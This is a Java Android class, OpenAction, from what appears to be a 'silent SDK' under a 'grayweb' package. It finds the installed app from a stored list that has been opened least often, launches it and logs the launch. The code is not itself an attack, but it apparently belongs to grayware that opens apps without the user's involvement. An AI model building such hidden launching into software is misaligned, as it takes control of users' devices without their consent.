package sdk.grayweb.com.slientsdk.action;

import android.content.Context;
import android.content.Intent;

import java.sql.SQLException;
import java.util.List;

import sdk.grayweb.com.slientsdk.model.ActionModel;
import sdk.grayweb.com.slientsdk.model.ApkModel;

/**
 * Created by engine on 16/5/11.
 */
public class OpenAction extends  AbstractAction{
    public OpenAction(Context context) {
        super(context);
    }

    @Override
    public int doAction() {
        try {
            List<ApkModel> apkModels = apkModelDao.queryForAll();
            ApkModel targetApk =null ;
            for (int i=0;i<apkModels.size();i++){
                ApkModel model = apkModels.get(i);
                if (hasInstall(model.packagename)){
                    if (targetApk==null){
                       targetApk=model ;
                    }else {
                        if(targetApk.opentimes>model.opentimes){
                            targetApk=model ;
                        }
                    }
                }else {
                    apkModels.remove(i);
                    i-- ;
                }
            }
            //open package
            if (targetApk!=null) {
                Intent intent = mContext.getPackageManager().getLaunchIntentForPackage(targetApk.packagename);
                mContext.startActivity(intent);
                ActionModel actionModel = new ActionModel();
                actionModel.type = 3;
                actionModel.time = System.currentTimeMillis();
                actionModel.packageName = targetApk.packagename;
                actionDao.create(actionModel) ;
                return  1 ;
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return 0;
    }
}
